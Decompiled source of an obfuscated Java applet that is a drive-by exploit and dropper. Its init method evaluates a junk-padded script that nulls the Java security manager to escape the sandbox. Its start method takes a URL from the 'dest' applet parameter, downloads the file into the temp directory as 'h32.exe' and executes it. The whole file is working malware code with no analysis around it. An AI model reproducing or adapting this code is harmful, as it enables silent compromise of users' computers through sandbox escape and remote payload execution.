import javax.script.ScriptException;
import java.awt.Component;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Tesia extends Applet
{
    String coss;
    private JList luwwsd;
    
    public Tesia() {
        this.coss = new String();
    }
    
    @Override
    public void init() {
        try {
            String kss = new String();
            for (int i = 0; i < 1; ++i) {
                kss += "";
            }
            final Men script = new Men();
            final int a = 0;
            script.kkswwop.eval("vgwhwhdar ergwhwhdrogwhwhdr = negwhwhdw Ergwhwhdrogwhwhdr(\"gwhwhdy ergwhwhdrogwhwhdr\");thgwhwhdis.togwhwhdStrgwhwhdingwhwhdg = fugwhwhdncgwhwhdtion(){ jagwhwhdva.lagwhwhdng.Sygwhwhdstegwhwhdm.segwhwhdtSegwhwhdcurgwhwhdityManagwhwhdger(nugwhwhdll);appgwhwhdlet.stgwhwhdargwhwhdt();regwhwhdtugwhwhdrn \"exgwhwhdplogwhwhdit!\";};ergwhwhdrgwhwhdor.messgwhwhdaggwhwhde = thigwhwhds;".replace("gwhwhd", ""));
            final int aa = a * 2;
            this.luwwsd = new JList((E[])new Object[] { script.kkswwop.get("ergwhwhdrogwhwhdr".replace("gwhwhd", "")) });
            final int c = a + aa - 1;
            for (int j = 0; j < 1; ++j) {
                kss += "";
            }
            this.add(this.luwwsd);
        }
        catch (ScriptException ex) {}
    }
    
    @Override
    public void start() {
        try {
            final String c = new String();
            final Pol kk = new Pol();
            String kloir = kk.Pysta();
            if (kloir.charAt(kloir.length() - 1) != '\\') {
                kloir += "\\";
            }
            final String mjop = kloir + "hkeekdd3keek2.ekeekxkeeke".replace("keek", "");
            final String b = new String();
            final Ou kuwdg = new Ou();
            final String a = new String();
            final String poisona = this.getParameter("dliee42esliee42t".replace("liee42", ""));
            final String d = new String();
            final String dpoisona = kk.Tapa(poisona);
            kuwdg.qghq = kuwdg.Seagj(mjop);
            final String e = new String();
            kuwdg.lkefdw = Sikol.Ewsgh(dpoisona);
            final String f = new String();
            byte[] ooouyt = new byte[153601];
            final String g = new String();
            final int ahahah = 11;
            final byte[] kkky = new byte[100];
            final String fff = new String();
            int cnt = 0;
            while ((cnt = kuwdg.lkefdw.read(ooouyt)) > 0) {
                final String z = new String();
                kuwdg.qghq.write(ooouyt, 0, cnt);
                ooouyt = new byte[153601];
            }
            final String asa = new String();
            kuwdg.qghq.close();
            final String ddww = new String();
            kuwdg.lkefdw.close();
            try {
                final String aaa0 = new String();
                Sikol.Wefmi(mjop);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public class s
    {
    }
}
